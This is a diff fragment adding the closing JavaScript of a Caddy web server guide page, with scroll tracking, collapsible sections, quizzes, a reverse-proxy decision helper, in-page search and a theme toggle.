+        map[cur.id].classList.add('active');
+        var act=map[cur.id];
+        var sb=document.querySelector('.sidebar');
+        if(sb && act.offsetTop<sb.scrollTop || act.offsetTop>sb.scrollTop+sb.clientHeight-40){
+          // keep active link in view
+          sb.scrollTop=act.offsetTop-sb.clientHeight/2;
+        }
+      }
+      document.getElementById('toTop').classList.toggle('show',y>600);
+    }
+    window.addEventListener('scroll',onScroll,{passive:true});
+    onScroll();
+  }
+
+  /* ---------- collapsible parts (h2) ---------- */
+  function setupCollapse(){
+    document.querySelectorAll('main h2[id]').forEach(function(h){
+      h.addEventListener('click',function(e){
+        // ignore clicks on links inside heading
+        if(e.target.tagName==='A')return;
+        var collapsed=h.classList.toggle('collapsed');
+        var el=h.nextElementSibling;
+        while(el && el.tagName!=='H2'){
+          if(el.tagName==='HR'){el=el.nextElementSibling;continue;}
+          el.classList.toggle('collapsed-body',collapsed);
+          el=el.nextElementSibling;
+        }
+      });
+    });
+  }
+
+  /* ---------- quizzes ---------- */
+  function setupQuiz(){
+    document.querySelectorAll('.quiz-item').forEach(function(item){
+      var opts=[].slice.call(item.querySelectorAll('.quiz-opt'));
+      var explain=item.querySelector('.quiz-explain');
+      opts.forEach(function(opt){
+        opt.addEventListener('click',function(){
+          if(item.dataset.done)return;
+          item.dataset.done='1';
+          opts.forEach(function(o){
+            o.classList.add('locked');
+            if(o.dataset.correct==='true')o.classList.add('correct');
+          });
+          if(opt.dataset.correct!=='true')opt.classList.add('wrong');
+          if(explain)explain.hidden=false;
+        });
+      });
+    });
+  }
+
+  /* ---------- decision helper ---------- */
+  function setupDecision(){
+    var box=document.getElementById('decision-helper'); if(!box)return;
+    var out=document.getElementById('decision-out');
+    function compute(){
+      var w={caddy:0,against:0,traefik:0};
+      box.querySelectorAll('input:checked').forEach(function(c){
+        w[c.dataset.w]+=parseInt(c.value,10);
+      });
+      var verdict,cls,reasons;
+      if(w.caddy===0 && w.against===0 && w.traefik===0){
+        out.innerHTML='<span class="decision-verdict">Select options above for a recommendation.</span>';
+        return;
+      }
+      if(w.traefik>=2 && w.traefik>=w.caddy){
+        verdict='Consider Traefik'; cls='alt';
+        reasons='Docker-label auto-discovery is Traefik’s native strength. Caddy can do it with plugins, but if that’s a core requirement, Traefik is the cleaner fit.';
+      } else if(w.against>w.caddy){
+        verdict='Caddy is probably not the best fit'; cls='alt';
+        reasons='Your needs lean toward a specialist: HAProxy/Envoy for L4 or extreme scale, Nginx+ModSecurity or a cloud WAF for filtering, or sticking with a working Nginx setup. See Part 12.6.';
+      } else if(w.against>0 && w.caddy-w.against<=1){
+        verdict='Caddy works — with caveats'; cls='maybe';
+        reasons='Caddy fits most of your needs, but weigh the constraints you checked. For those specific concerns, a specialist tool may still be worth pairing in.';
+      } else {
+        verdict='Caddy is a strong fit'; cls='caddy';
+        reasons='Automatic HTTPS, a simple config, and a single dependency-free binary line up well with what you need. Start with the Caddyfile and reach for the JSON API only if you outgrow it.';
+      }
+      out.innerHTML='<span class="decision-verdict '+cls+'">'+verdict+'</span>'
+        +'<p class="decision-reasons">'+reasons+'</p>';
+    }
+    box.addEventListener('change',compute);
+  }
+
+  /* ---------- search ---------- */
+  function setupSearch(){
+    var input=document.getElementById('search');
+    var tocItems=[].slice.call(document.querySelectorAll('.toc li'));
+    function clearMarks(){
+      document.querySelectorAll('main mark.hit').forEach(function(m){
+        var t=document.createTextNode(m.textContent); m.parentNode.replaceChild(t,m);
+      });
+    }
+    var t;
+    input.addEventListener('input',function(){
+      clearTimeout(t); t=setTimeout(run,150);
+    });
+    function run(){
+      var q=input.value.trim().toLowerCase();
+      // filter TOC
+      tocItems.forEach(function(li){
+        var a=li.querySelector('a'); if(!a)return;
+        li.classList.toggle('hide', q!=='' && a.textContent.toLowerCase().indexOf(q)===-1);
+      });
+      clearMarks();
+      if(q.length<2)return;
+      // highlight in body (text nodes only, skip code/script)
+      var rx=new RegExp('('+q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+')','gi');
+      var walker=document.createTreeWalker(document.querySelector('main'),NodeFilter.SHOW_TEXT,{
+        acceptNode:function(node){
+          if(!node.nodeValue.trim())return NodeFilter.FILTER_REJECT;
+          var p=node.parentNode;
+          while(p && p!==document.body){
+            var tn=p.tagName;
+            if(tn==='CODE'||tn==='PRE'||tn==='SCRIPT'||tn==='STYLE'||tn==='MARK')return NodeFilter.FILTER_REJECT;
+            p=p.parentNode;
+          }
+          return rx.test(node.nodeValue)?NodeFilter.FILTER_ACCEPT:NodeFilter.FILTER_REJECT;
+        }
+      });
+      var nodes=[],nd; while(nd=walker.nextNode())nodes.push(nd);
+      var count=0;
+      nodes.forEach(function(node){
+        if(count>400)return;
+        var frag=document.createDocumentFragment(); var last=0,s=node.nodeValue; rx.lastIndex=0; var m;
+        while((m=rx.exec(s))){
+          frag.appendChild(document.createTextNode(s.slice(last,m.index)));
+          var mk=document.createElement('mark'); mk.className='hit'; mk.textContent=m[0];
+          frag.appendChild(mk); last=m.index+m[0].length; count++;
+          if(m.index===rx.lastIndex)rx.lastIndex++;
+        }
+        frag.appendChild(document.createTextNode(s.slice(last)));
+        node.parentNode.replaceChild(frag,node);
+      });
+    }
+  }
+
+  /* ---------- theme + mobile nav + shortcuts ---------- */
+  function setupChrome(){
+    var root=document.documentElement;
+    var saved=localStorage.getItem('caddy-theme');
+    if(saved)root.setAttribute('data-theme',saved);
+    document.getElementById('themeBtn').addEventListener('click',function(){
+      var cur=root.getAttribute('data-theme')==='light'?'dark':'light';
+      root.setAttribute('data-theme',cur); localStorage.setItem('caddy-theme',cur);
+    });
+    var sb=document.querySelector('.sidebar'), scrim=document.querySelector('.scrim');
+    function close(){sb.classList.remove('open');scrim.classList.remove('show');}
+    document.getElementById('menuBtn').addEventListener('click',function(){
+      sb.classList.toggle('open');scrim.classList.toggle('show');
+    });
+    scrim.addEventListener('click',close);
+    sb.addEventListener('click',function(e){if(e.target.tagName==='A')close();});
+    document.getElementById('toTop').addEventListener('click',function(){
+      window.scrollTo({top:0,behavior:'smooth'});
+    });
+    document.addEventListener('keydown',function(e){
+      if(e.key==='/'&&document.activeElement.id!=='search'){e.preventDefault();document.getElementById('search').focus();}
+      else if(e.key==='Escape'){close();document.getElementById('search').blur();}
+      else if(e.key==='t'&&document.activeElement.tagName!=='INPUT'){document.getElementById('themeBtn').click();}
+    });
+  }
+
+  document.addEventListener('DOMContentLoaded',function(){
+    enhanceCode(); wrapTables(); setupSpy(); setupCollapse();
+    setupQuiz(); setupDecision(); setupSearch(); setupChrome();
+  });
+})();
+</script>
+</body>
+</html>
